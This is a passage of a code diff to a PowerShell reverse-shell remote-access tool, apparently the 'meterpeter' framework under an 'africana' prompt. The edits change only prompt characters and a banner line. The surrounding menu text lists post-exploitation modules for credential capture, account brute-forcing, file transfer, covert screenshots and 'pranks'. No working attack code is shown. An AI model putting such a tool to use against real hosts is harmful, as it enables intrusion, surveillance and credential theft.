-        write-host "`n`n(africana:framework)#Post:Creds> " -NoNewline -ForeGroundColor Green;
+        write-host "`n`n(africana:framework):Post:Creds> " -NoNewline -ForeGroundColor Green;
         $cred_choise = Read-Host;
         If($cred_choise -ieq "Start")
         {
@@ -4130,7 +4180,7 @@ Stream_Desktop_Live ..
          write-host "   -------  -----------                  ------------------";
          write-host "   Start    Bruteforcing user account    UserLand";
          write-host "   Return   Return to Server Main Menu" -ForeGroundColor yellow
-         write-host "`n`n(africana:framework)#Post:BruteAcc> " -NoNewline -ForeGroundColor Green;
+         write-host "`n`n(africana:framework):Post:BruteAcc> " -NoNewline -ForeGroundColor Green;
          $Brute_choise = Read-Host;
          If($Brute_choise -ieq "Start")
          {
@@ -4193,7 +4243,7 @@ Stream_Desktop_Live ..
         write-host "   -------   -----------                     ------------------";
         write-host "   Start     Download from rhost to lhost    UserLand";
         write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
-        write-host "`n`n(africana:framework)#Download> " -NoNewline -ForeGroundColor Green;
+        write-host "`n`n(africana:framework):Download> " -NoNewline -ForeGroundColor Green;
         $Download_choise = Read-Host;
         If($Download_choise -ieq "Start")
         {
@@ -4232,7 +4282,7 @@ Stream_Desktop_Live ..
         write-host "   -------   -----------                     ------------------";
         write-host "   Start     Upload from lhost to rhost      UserLand";
         write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
-        write-host "`n`n(africana:framework)#Upload> " -NoNewline -ForeGroundColor Green;
+        write-host "`n`n(africana:framework):Upload> " -NoNewline -ForeGroundColor Green;
         $Upload_choise = Read-Host;
         If($Upload_choise -ieq "Start")
         {
@@ -4288,7 +4338,7 @@ Stream_Desktop_Live ..
         write-host "   Snapshot    Capture one desktop_screenshot  UserLand";
         write-host "   SpyScreen   Capture multiple screenshots    UserLand";
         write-host "   Return      Return to Server Main Menu" -ForeGroundColor yellow;
-        write-host "`n`n(africana:framework)#Screenshots> " -NoNewline -ForeGroundColor Green;
+        write-host "`n`n(africana:framework):Screenshots> " -NoNewline -ForeGroundColor Green;
         $choise_two = Read-Host;
         If($choise_two -ieq "Snapshot")
         {
@@ -4462,7 +4512,7 @@ Stream_Desktop_Live ..
       Write-Host "[ NetScanner   Local LAN network scanner sub-menu         ]     " -ForegroundColor Blue
       Write-Host "[ Pranks       Prank remote host modules sub-menu         ]     " -ForegroundColor Blue
       Write-Host "[ exit         Exit rev_tcp_shell [server+client]         ]     " -ForegroundColor Blue
-       write-host "`n  * GitHub: https://github.com/r00t-3xp10it/meterpeter *`n" -ForegroundColor Blue
+      Write-host "`n  * GitHub: https://github.com/r00t-3xp10it/meterpeter *`n    " -ForegroundColor Blue
     }
     $Command = $Null;
   }
@@ -4647,4 +4697,4 @@ Stream_Desktop_Live ..
     $OutPut = $Null;
   }
  }
-}
+}
